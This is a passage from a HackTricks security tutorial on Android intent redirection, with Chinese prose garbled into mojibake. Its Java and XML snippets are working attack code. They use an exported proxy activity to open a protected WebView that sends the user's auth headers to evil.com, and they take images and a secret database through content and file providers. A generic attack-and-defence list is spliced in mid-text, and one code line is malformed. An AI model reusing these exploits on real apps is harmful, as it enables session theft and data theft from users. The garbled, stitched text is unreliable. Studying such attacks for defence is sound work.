<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


**ç ”ç©¶æ¥æºäº** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# ä»‹ç»

è¿™ä¸ªæ¼æ´ç±»ä¼¼äº**Webå®‰å…¨ä¸­çš„å¼€æ”¾é‡å®šå‘**ã€‚ç”±äºç±»`Intent`æ˜¯`Parcelable`çš„ï¼Œ**å±äºè¿™ä¸ªç±»çš„å¯¹è±¡**å¯ä»¥ä½œä¸º**é¢å¤–çš„æ•°æ®**ä¼ é€’ç»™å¦ä¸€ä¸ª`Intent`å¯¹è±¡ã€‚\
è®¸å¤šå¼€å‘äººå‘˜åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œåˆ›å»º**ä»£ç†ç»„ä»¶**ï¼ˆæ´»åŠ¨ã€å¹¿æ’­æ¥æ”¶å™¨å’ŒæœåŠ¡ï¼‰ï¼Œå°†åµŒå…¥çš„`Intent`ä¼ é€’ç»™`startActivity(...)`ã€`sendBroadcast(...)`ç­‰å±é™©æ–¹æ³•ã€‚\
è¿™æ˜¯å±é™©çš„ï¼Œå› ä¸º**æ”»å‡»è€…å¯ä»¥å¼ºåˆ¶åº”ç”¨å¯åŠ¨ä¸€ä¸ªä¸èƒ½ä»å¦ä¸€ä¸ªåº”ç”¨ç›´æ¥å¯åŠ¨çš„éå¯¼å‡ºç»„ä»¶**ï¼Œæˆ–è€…æˆäºˆæ”»å‡»è€…è®¿é—®å…¶å†…å®¹æä¾›ç¨‹åºçš„æƒé™ã€‚**`WebView`**æœ‰æ—¶ä¹Ÿä¼šå°†**URLä»å­—ç¬¦ä¸²è½¬æ¢ä¸º`Intent`**å¯¹è±¡ï¼Œä½¿ç”¨`Intent.parseUri(...)`æ–¹æ³•ï¼Œå¹¶å°†å…¶ä¼ é€’ç»™`startActivity(...)`ã€‚

{% hint style="info" %}
ç®€è€Œè¨€ä¹‹ï¼šå¦‚æœæ”»å‡»è€…å¯ä»¥å‘é€ä¸€ä¸ªæ­£åœ¨ä¸å®‰å…¨æ‰§è¡Œçš„Intentï¼Œä»–å¯èƒ½ä¼šè®¿é—®æœªå¯¼å‡ºçš„ç»„ä»¶å¹¶æ»¥ç”¨å®ƒä»¬ã€‚
{% endhint %}

# å…¸å‹æ¡ˆä¾‹

è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ã€‚`AndroidManifest.xml`æ–‡ä»¶çš„ç‰‡æ®µ
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
æ´»åŠ¨ `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
æ´»åŠ¨ `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity`æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå±•ç¤ºäº†æ‰§è¡ŒæŸäº›ä¸å®‰å…¨æ“ä½œçš„**éšè—åº”ç”¨åŠŸèƒ½**ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒå°†ç”¨æˆ·çš„èº«ä»½éªŒè¯ä¼šè¯ä¼ é€’ç»™ä»`url`å‚æ•°è·å–çš„URLã€‚

å‡ºäºå‡ºå£é™åˆ¶çš„åŸå› ï¼Œ**æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®`AuthWebViewActivity`**ã€‚ç›´æ¥è°ƒç”¨
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
æŠ›å‡º`java.lang.SecurityException`ï¼Œç”±äº`Permission Denial`ï¼š`AuthWebViewActivity`æœªä»uid 1337å¯¼å‡ºã€‚

ä½†æ”»å‡»è€…å¯ä»¥**å¼ºåˆ¶å—å®³è€…å¯åŠ¨`AuthWebViewActivity`æœ¬èº«**ï¼š
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
å¹¶ä¸”ä¸ä¼šå¼•å‘ä»»ä½•å®‰å…¨è¿è§„ï¼Œå› ä¸º**å—æ”»å‡»çš„åº”ç”¨ç¨‹åºå¯ä»¥è®¿é—®å…¶æ‰€æœ‰ç»„ä»¶**ã€‚ä½¿ç”¨è¿™æ®µä»£ç ç‰‡æ®µï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡Androidç³»ç»Ÿçš„å†…ç½®é™åˆ¶ã€‚

# æå‡æ”»å‡»å½±å“

ä¸ºäº†æå‡æ­¤æ¼æ´çš„å½±å“ï¼Œæ‚¨éœ€è¦**æ‰¾åˆ°å…¶ä»–æ¼æ´/é…ç½®é”™è¯¯ï¼Œä»¥å¢åŠ æ¼æ´çš„å½±å“**ï¼ˆå› ä¸ºå•ç‹¬çš„æ¼æ´å¹¶ä¸ä¼šäº§ç”Ÿä»»ä½•é£é™©ï¼‰ã€‚

## é€šè¿‡å†…å®¹æä¾›ç¨‹åºæå‡æ”»å‡»

é™¤äº†è®¿é—®åŸå§‹åº”ç”¨ç¨‹åºçš„ä»»æ„ç»„ä»¶å¤–ï¼Œ**æ”»å‡»è€…è¿˜å¯ä»¥å°è¯•è®¿é—®æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„æ˜“å—æ”»å‡»åº”ç”¨ç¨‹åºçš„å†…å®¹æä¾›ç¨‹åº**ï¼š

* å®ƒå¿…é¡»æ˜¯**éå¯¼å‡ºçš„**ï¼ˆå¦åˆ™å¯ä»¥**ç›´æ¥æ”»å‡»**ï¼Œè€Œä¸ä½¿ç”¨æˆ‘ä»¬åœ¨æœ¬æ–‡ä¸­è®¨è®ºçš„æ¼æ´ï¼‰
* å®ƒå¿…é¡»è®¾ç½®äº†**`android:grantUriPermissions`**æ ‡å¿—ä¸º**`true`**ã€‚
* `android:grantUriPermissions="true"`è¡¨ç¤ºæ‚¨çš„Javaä»£ç å¯ä»¥ä½¿ç”¨`FLAG_GRANT_READ_URI_PERMISSION`å’Œ`FLAG_GRANT_WRITE_URI_PERMISSION`æ¥è®¿é—®è¯¥`ContentProvider`æä¾›çš„**ä»»ä½•`Uri`**ã€‚
* `android:grantUriPermissions="false"`è¡¨ç¤º**åªèƒ½ä½¿ç”¨å­`<grant-uri-permission>`å…ƒç´ æŒ‡å®šçš„`Uri`å€¼**ä¸`FLAG_GRANT_READ_URI_PERMISSION`å’Œ`FLAG_GRANT_WRITE_URI_PERMISSION`ä¸€èµ·ä½¿ç”¨ã€‚

æ”»å‡»è€…å¿…é¡»å°†è‡ªå·±è®¾ç½®ä¸ºåµŒå…¥æ„å›¾çš„æ¥æ”¶è€…ï¼Œå¹¶è®¾ç½®ä»¥ä¸‹æ ‡å¿—ï¼š

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION`å…è®¸å¯¹æä¾›ç¨‹åºè¿›è¡ŒæŒä¹…è®¿é—®ï¼ˆå¦‚æœæ²¡æœ‰æ­¤æ ‡å¿—ï¼Œè®¿é—®ä»…é™ä¸€æ¬¡ï¼‰
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION`å…è®¸é€šè¿‡å‰ç¼€è®¿é—®URI - ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨URI `content://com.victim.provider/` æˆäºˆå¯¹æä¾›ç¨‹åºçš„æ‰€æœ‰å†…å®¹çš„è®¿é—®æƒé™ï¼Œç„¶åä½¿ç”¨`ContentResolver`æ¥è®¿é—® `content://com.victim.provider/image/1`ã€`content://com.victim.provider/image/2`ç­‰ã€‚
* `Intent.FLAG_GRANT_READ_URI_PERMISSION`å…è®¸å¯¹æä¾›ç¨‹åºè¿›è¡Œè¯»å–æ“ä½œï¼ˆä¾‹å¦‚`query`ã€`openFile`ã€`openAssetFile`ï¼‰
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION`å…è®¸è¿›è¡Œå†™å…¥æ“ä½œ

ä¸€ä¸ªå…¸å‹çš„æä¾›ç¨‹åºç¤ºä¾‹ï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®å¹¶æ‰§è¡Œå¸¸è§„æ“ä½œï¼Œå¦‚`query`ã€`update`ã€`insert`ã€`delete`ã€`openFile`ã€`openAssetFile`
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
åœ¨`AndroidManifest.xml`æ–‡ä»¶ä¸­çªƒå–ç”¨æˆ·å›¾ç‰‡çš„ç¤ºä¾‹

```xml
<activity android:name=".MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.PICK" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="image/*" />
    </intent-filter>
</activity>
```

åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œ`AndroidManifest.xml`æ–‡ä»¶ä¸­çš„`MainActivity`æ´»åŠ¨å®šä¹‰äº†ä¸€ä¸ªæ„å›¾è¿‡æ»¤å™¨ï¼Œç”¨äºæ•è·ç”¨æˆ·é€‰æ‹©å›¾ç‰‡çš„æ„å›¾ã€‚è¯¥æ„å›¾è¿‡æ»¤å™¨æŒ‡å®šäº†ä»¥ä¸‹æ¡ä»¶ï¼š

- `android.intent.action.PICK`ï¼šæŒ‡å®šæ„å›¾çš„æ“ä½œä¸ºé€‰æ‹©æ“ä½œã€‚
- `android.intent.category.DEFAULT`ï¼šæŒ‡å®šæ„å›¾çš„é»˜è®¤ç±»åˆ«ã€‚
- `image/*`ï¼šæŒ‡å®šæ„å›¾çš„æ•°æ®ç±»å‹ä¸ºå›¾åƒç±»å‹ã€‚

é€šè¿‡è¿™ä¸ªæ„å›¾è¿‡æ»¤å™¨ï¼Œæ”»å‡»è€…å¯ä»¥æ¬ºéª—ç”¨æˆ·é€‰æ‹©å›¾ç‰‡ï¼Œå¹¶å°†ç”¨æˆ·é€‰æ‹©çš„å›¾ç‰‡ä¼ è¾“åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ä¸Šï¼Œä»è€Œçªƒå–ç”¨æˆ·çš„å›¾ç‰‡ã€‚
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
`MainActivity.java` æ–‡ä»¶
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
| Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
| Intent.FLAG_GRANT_READ_URI_PERMISSION
| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## å¯¹Androidæ–‡ä»¶æä¾›ç¨‹åºçš„æ”»å‡»

è¿™ä¸ªæ¼æ´è¿˜ä½¿å¾—æ”»å‡»è€…æœ‰å¯èƒ½çªƒå–å¼€å‘è€…é¢„å®šçš„ç›®å½•ä¸­çš„åº”ç”¨æ–‡ä»¶ã€‚ä¸ºäº†æˆåŠŸæ”»å‡»ï¼Œæ¶æ„åº”ç”¨éœ€è¦è·å¾—å¯¹Androidæ–‡ä»¶æä¾›ç¨‹åºçš„è®¿é—®æƒé™ï¼Œç„¶åä½¿ç”¨Android ContentResolverä»æ–‡ä»¶æä¾›ç¨‹åºä¸­è¯»å–å†…å®¹ã€‚

ç¤ºä¾‹æ–‡ä»¶æä¾›ç¨‹åºï¼ˆæ›´å¤šè¯¦ç»†ä¿¡æ¯è¯·å‚è§[https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider)ï¼‰
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
å®ƒæä¾›å¯¹ç‰¹æ®Šåˆ—è¡¨ä¸­çš„æ–‡ä»¶çš„è¯»å†™è®¿é—®æƒé™ï¼Œè¯¥åˆ—è¡¨å¯ä»¥åœ¨åº”ç”¨èµ„æºä¸­æ‰¾åˆ°ï¼Œä¾‹å¦‚åœ¨ `res/xml/provider_paths.xml` ä¸­ã€‚

å®ƒå¯èƒ½çœ‹èµ·æ¥æœ‰äº›åƒ
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
<root-path name="root" path=""/>
<files-path name="internal_files" path="."/>
<cache-path name="cache" path=""/>
<external-path name="external_files" path="images"/>
</paths>
```
æ¯ä¸ªæ ‡ç­¾éƒ½æŒ‡å®šäº†ä¸€ä¸ªæ ¹ç›®å½•ï¼Œå…¶`path`å€¼ç›¸å¯¹äºæ ¹ç›®å½•ã€‚ä¾‹å¦‚ï¼Œå€¼`external_files`å°†å¯¹åº”äº`new File(Environment.getExternalStorageDirectory(), "images")`ã€‚

å€¼`root-path`å¯¹åº”äº`/`ï¼Œå³æä¾›å¯¹ä»»æ„æ–‡ä»¶çš„è®¿é—®ã€‚

å‡è®¾æˆ‘ä»¬æœ‰ä¸€äº›ç§˜å¯†æ•°æ®å­˜å‚¨åœ¨æ–‡ä»¶`/data/data/com.victim/databases/secret.db`ä¸­ï¼šå¯¹è¯¥æ–‡ä»¶çš„çªƒå–å¯èƒ½å¦‚ä¸‹æ‰€ç¤º`MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## é€šè¿‡WebViewè®¿é—®ä»»æ„ç»„ä»¶

å¯ä»¥é€šè¿‡è°ƒç”¨`Intent.toUri(flags)`å°†Intentå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶é€šè¿‡`Intent.parseUri(stringUri, flags)`å°†å­—ç¬¦ä¸²è½¬æ¢å›Intentã€‚è¿™ä¸ªåŠŸèƒ½é€šå¸¸åœ¨WebViewï¼ˆåº”ç”¨å†…ç½®æµè§ˆå™¨ï¼‰ä¸­ä½¿ç”¨ï¼š**åº”ç”¨ç¨‹åºå¯ä»¥éªŒè¯`intent://`æ–¹æ¡ˆï¼Œå°†URLè§£æä¸ºIntentå¹¶å¯åŠ¨æ´»åŠ¨**ã€‚

**è¿™ä¸ªæ¼æ´å¯ä»¥é€šè¿‡å…¶ä»–æ¼æ´**ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¯¼å‡ºçš„æ´»åŠ¨ç›´æ¥åœ¨WebViewä¸­æ‰“å¼€ä»»æ„é“¾æ¥çš„èƒ½åŠ›æˆ–é€šè¿‡æ·±é“¾æ¥æœºåˆ¶ï¼‰åœ¨å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºä¸­åˆ©ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨è¿œç¨‹ç¯å¢ƒä¸­åˆ©ç”¨ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨ç«¯çš„è·¨ç«™è„šæœ¬æ”»å‡»æˆ–å®¢æˆ·ç«¯çš„ä¸­é—´äººæ”»å‡»ã€‚

æ¼æ´ä»£ç ç¤ºä¾‹
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
è¿™é‡Œçš„é‡ç‚¹æ˜¯`WebViewClient`ç±»çš„`shouldOverrideUrlLoading(...)`æ–¹æ³•åœ¨WebViewå°è¯•åŠ è½½æ–°é“¾æ¥æ—¶è¢«è°ƒç”¨ï¼Œä½†å®ƒç»™äº†åº”ç”¨ç¨‹åºæ·»åŠ è‡ªå®šä¹‰å¤„ç†ç¨‹åºçš„é€‰é¡¹ã€‚

ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªWebViewé‡å®šå‘åˆ°ä¸€ä¸ªç‰¹åˆ«å‡†å¤‡çš„intent-scheme URLã€‚URLåˆ›å»ºçš„ç¤ºä¾‹ï¼š
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
æ”»å‡»ç¤ºä¾‹

### æ”»å‡»ç›®æ ‡

åœ¨è¿›è¡Œæ”»å‡»ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®æ”»å‡»çš„ç›®æ ‡ã€‚åœ¨Androidåº”ç”¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„å›¾ï¼ˆIntentï¼‰æ³¨å…¥æ”»å‡»æ¥å®ç°å„ç§æ”»å‡»ç›®æ ‡ï¼Œä¾‹å¦‚ï¼š

- çªƒå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯
- ä¿®æ”¹åº”ç”¨ç¨‹åºè¡Œä¸º
- ç»•è¿‡åº”ç”¨ç¨‹åºçš„å®‰å…¨æªæ–½

### æ”»å‡»æ­¥éª¤

ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ„å›¾æ³¨å…¥æ”»å‡»çš„ç¤ºä¾‹æ­¥éª¤ï¼š

1. åˆ†æç›®æ ‡åº”ç”¨ç¨‹åºï¼šé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç›®æ ‡åº”ç”¨ç¨‹åºè¿›è¡Œåˆ†æï¼Œäº†è§£å…¶åŠŸèƒ½å’Œå¯èƒ½å­˜åœ¨çš„æ¼æ´ã€‚

2. è¯†åˆ«å¯æ³¨å…¥çš„æ„å›¾ï¼šæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç›®æ ‡åº”ç”¨ç¨‹åºä¸­å¯ä»¥æ¥å—å¤–éƒ¨æ„å›¾çš„ç»„ä»¶ï¼Œä¾‹å¦‚Activityã€Serviceæˆ–Broadcast Receiverã€‚

3. æ„é€ æ¶æ„æ„å›¾ï¼šæ ¹æ®ç›®æ ‡åº”ç”¨ç¨‹åºçš„ç»„ä»¶å’ŒåŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„æ„å›¾ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ“ä½œï¼Œä¾‹å¦‚å‘é€çŸ­ä¿¡ã€æ‹¨æ‰“ç”µè¯æˆ–è®¿é—®æ•æ„Ÿæ•°æ®ã€‚

4. å‘é€æ¶æ„æ„å›¾ï¼šé€šè¿‡å‘é€æ¶æ„æ„å›¾ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶æ³¨å…¥åˆ°ç›®æ ‡åº”ç”¨ç¨‹åºä¸­çš„ç»„ä»¶ä¸­ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„æ”»å‡»æ“ä½œã€‚

5. åˆ©ç”¨æ¼æ´ï¼šä¸€æ—¦æ¶æ„æ„å›¾è¢«æ¥å—å¹¶æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´æ¥å®ç°æˆ‘ä»¬çš„æ”»å‡»ç›®æ ‡ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æˆ–ä¿®æ”¹åº”ç”¨ç¨‹åºè¡Œä¸ºã€‚

### é˜²å¾¡æªæ–½

ä¸ºäº†é˜²æ­¢æ„å›¾æ³¨å…¥æ”»å‡»ï¼Œå¼€å‘äººå‘˜å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- éªŒè¯æ„å›¾æ¥æºï¼šåœ¨æ¥å—å¤–éƒ¨æ„å›¾ä¹‹å‰ï¼Œåº”ç”¨ç¨‹åºåº”è¯¥éªŒè¯æ„å›¾çš„æ¥æºï¼Œç¡®ä¿å…¶æ¥è‡ªå¯ä¿¡ä»»çš„æ¥æºã€‚

- é™åˆ¶æ„å›¾æ¥å—èŒƒå›´ï¼šåº”ç”¨ç¨‹åºåº”è¯¥é™åˆ¶æ¥å—æ„å›¾çš„ç»„ä»¶ï¼Œåªå…è®¸ç‰¹å®šçš„ç»„ä»¶æ¥å—å¤–éƒ¨æ„å›¾ã€‚

- è¾“å…¥éªŒè¯ï¼šåº”ç”¨ç¨‹åºåº”è¯¥å¯¹æ¥å—çš„æ„å›¾è¿›è¡Œè¾“å…¥éªŒè¯ï¼Œç¡®ä¿å…¶ç¬¦åˆé¢„æœŸçš„æ ¼å¼å’Œå†…å®¹ã€‚

- æœ€å°æƒé™åŸåˆ™ï¼šåº”ç”¨ç¨‹åºåº”è¯¥ä»¥æœ€å°æƒé™åŸåˆ™è¿è¡Œï¼Œåªæˆäºˆå¿…è¦çš„æƒé™ç»™ç»„ä»¶ã€‚

- å®‰å…¨ç¼–ç å®è·µï¼šå¼€å‘äººå‘˜åº”è¯¥éµå¾ªå®‰å…¨ç¼–ç å®è·µï¼Œé¿å…åœ¨åº”ç”¨ç¨‹åºä¸­å¼•å…¥å®‰å…¨æ¼æ´ã€‚

é€šè¿‡é‡‡å–è¿™äº›é˜²å¾¡æªæ–½ï¼Œå¼€å‘äººå‘˜å¯ä»¥å‡å°‘æ„å›¾æ³¨å…¥æ”»å‡»çš„é£é™©ï¼Œå¹¶æé«˜åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
è¿™ä¸ªç‰ˆæœ¬ä¸ç»å…¸ç‰ˆæœ¬çš„æ¼æ´ç›¸æ¯”æœ‰ä¸€äº›é™åˆ¶ï¼š

- åµŒå…¥çš„`Parcelable`å’Œ`Serializable`å¯¹è±¡æ— æ³•è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼ˆå®ƒä»¬å°†è¢«å¿½ç•¥ï¼‰
- å½“è°ƒç”¨`Intent.parseUri(...)`æ—¶ï¼Œä¸å®‰å…¨çš„æ ‡å¿—`Intent.FLAG_GRANT_READ_URI_PERMISSION`å’Œ`Intent.FLAG_GRANT_WRITE_URI_PERMISSION`å°†è¢«å¿½ç•¥ã€‚è§£æå™¨åªä¼šåœ¨è®¾ç½®äº†`Intent.URI_ALLOW_UNSAFE`ï¼ˆ`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))`ï¼‰æ ‡å¿—çš„æƒ…å†µä¸‹ä¿ç•™å®ƒä»¬ï¼Œè¿™ç§æƒ…å†µéå¸¸ç½•è§ã€‚

è®¸å¤šå¼€å‘äººå‘˜ä»ç„¶å¿˜è®°å¯¹é€šè¿‡WebViewæ¥æ”¶åˆ°çš„æ„å›¾è¿›è¡Œå®Œæ•´çš„è¿‡æ»¤ã€‚
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
startActivity(intent);
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
æ”»å‡»è€…å¯ä»¥é€šè¿‡é€‰æ‹©å™¨æŒ‡å®šä¸€ä¸ªéå¯¼å‡ºç»„ä»¶
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
å¹¶ç»•è¿‡åº”ç”¨å¯¹æ˜¾å¼æ„å›¾çš„ä¿æŠ¤ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å»ºè®®å¯¹é€‰æ‹©å™¨è¿›è¡Œè¿‡æ»¤ã€‚
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
ä½†æ˜¯å³ä½¿è¿›è¡Œäº†å®Œæ•´çš„è¿‡æ»¤ä¹Ÿä¸èƒ½ä¿è¯å®Œå…¨çš„ä¿æŠ¤ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªä¸æŸä¸ªæœªå¯¼å‡ºæ´»åŠ¨çš„`intent-filter`ç›¸å¯¹åº”çš„éšå¼æ„å›¾ã€‚æ´»åŠ¨å£°æ˜çš„ç¤ºä¾‹ï¼š
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<data android:scheme="victim" android:host="secure_handler" />
</intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
å› æ­¤ï¼Œæˆ‘ä»¬å»ºè®®åœ¨å¯åŠ¨æ´»åŠ¨ä¹‹å‰æ£€æŸ¥å…¶æ˜¯å¦å·²å¯¼å‡ºã€‚

## åˆ›å»ºä¸å®‰å…¨æ„å›¾çš„å…¶ä»–æ–¹æ³•

